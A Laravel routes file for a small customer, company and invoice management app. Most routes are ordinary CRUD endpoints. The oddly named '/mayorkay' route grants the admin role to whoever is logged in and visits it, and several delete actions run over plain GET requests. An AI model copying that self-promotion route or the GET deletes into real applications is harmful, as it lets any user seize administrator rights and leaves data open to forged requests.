<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Customercontroller;
use App\Http\Controllers\AllController;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('auth.login');
});

Route::get('/pagelogin', function () {
    return view('pagelogin');
});



Route::get('/myindex', [App\Http\Controllers\AllController::class, 'index'])->name('myindex');

Route::get('/mayorkay', function () {

    $user = \App\Models\User::find(auth()->user()->id);
 $user->assignRole('admin');
});




Auth::routes();


Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');


// Company Control
Route::get('/all-company', [App\Http\Controllers\CompanyController::class, 'index'])->name('all-company');
Route::get('add-company', [App\Http\Controllers\CompanyController::class, 'create'])->name('add-company');
Route::post('add-company', [App\Http\Controllers\CompanyController::class, 'store']);
Route::get('/edit-company/{company}', [App\Http\Controllers\CompanyController::class, 'edit'])->name('edit-company');
Route::post('edit-company/{company}', [App\Http\Controllers\CompanyController::class, 'update']);
Route::get('about-company/{company}', [App\Http\Controllers\CompanyController::class, 'show'])->name('about-company');
Route::get('delete_company/{company}', [App\Http\Controllers\CompanyController::class, 'destroy'])->name('delete_company');


// Customer Control
Route::get('/all-customer', [App\Http\Controllers\CustomerController::class, 'index'])->name('all-customer');
Route::get('add-customer', [App\Http\Controllers\CustomerController::class, 'create'])->name('add-customer');
Route::post('add-customer', [App\Http\Controllers\CustomerController::class, 'store']);
Route::get('/edit-customer/{customer}', [App\Http\Controllers\CustomerController::class, 'edit'])->name('edit-customer');
Route::post('edit-customer/{customer}', [App\Http\Controllers\CustomerController::class, 'update']);
Route::get('view-invoice/{customer}', [App\Http\Controllers\CustomerController::class, 'show'])->name('view-invoice');
Route::get('delete_customer/{customer}', [App\Http\Controllers\CustomerController::class, 'destroy'])->name('delete_customer');






// invoice
Route::get('/account-invoice', function () {
    return view('account-invoice');
})->name('account-invoice');

Route::get('/add-invoice', function () {
    return view('add-invoice');
})->name('add-invoice');

Route::get('/edit-invoice', function () {
    return view('edit-invoice');
})->name('edit-invoice');

// Route::get('/report-customer', function () {
//     return view('report-customer');
// })->name('report-customer');


// // company
// Route::get('/about-company', function () {
//     return view('about-company');
// })->name('about-company');

Route::get('/add-company', function () {
    return view('add-company');
})->name('add-company');

// Route::get('/edit-company', function () {
//     return view('edit-company');
// })->name('edit-company');

// Route::get('/all-company', function () {
//     return view('all-company');
// })->name('all-company');

Route::get('/report-customer', [App\Http\Controllers\ReportcustomerController::class, 'index'])->name('report-customer');






Route::get('/search-customer', [App\Http\Controllers\AllController::class, 'searchcustom'])->name('search-customer');

Route::get('/custom-company', [App\Http\Controllers\AllController::class, 'customcompany'])->name('custom-company');

Route::get('/custom-company-status', [App\Http\Controllers\AllController::class, 'customcompanystatus'])->name('custom-company-status');

Route::get('/logout', '\App\Http\Controllers\Auth\LoginController@logout');

